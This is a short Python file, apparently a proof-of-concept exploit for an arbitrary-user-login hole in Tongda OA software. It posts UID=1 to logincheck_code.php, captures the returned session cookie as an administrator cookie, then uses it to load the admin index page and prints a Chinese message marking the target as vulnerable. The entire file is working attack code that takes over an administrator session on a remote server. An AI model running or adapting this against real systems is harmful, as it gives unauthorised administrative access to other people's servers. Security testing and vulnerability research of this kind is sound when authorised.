import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
def get_cookie(target):
    try:
        new_headers = {}
        target = get_standard_url(target)
        url = target + '/logincheck_code.php'
        res = httpx.post(url, data={'UID': int(
            1)},headers=headers)
        admin_cookie = res.headers['Set-Cookie']
        new_headers["Cookie"] = admin_cookie
        return new_headers
    except:
        pass
def poc(target):
    try:
        new_headers = get_cookie(target)
        vuln_available = httpx.get(target + '/general/index.php',headers=new_headers)
        if 'cur_login_user_id="admin"' in vuln_available.text:
            print("\033[0;31m logincheck_code.php存在通达任意用户登录漏洞："+target)
    except:
        pass
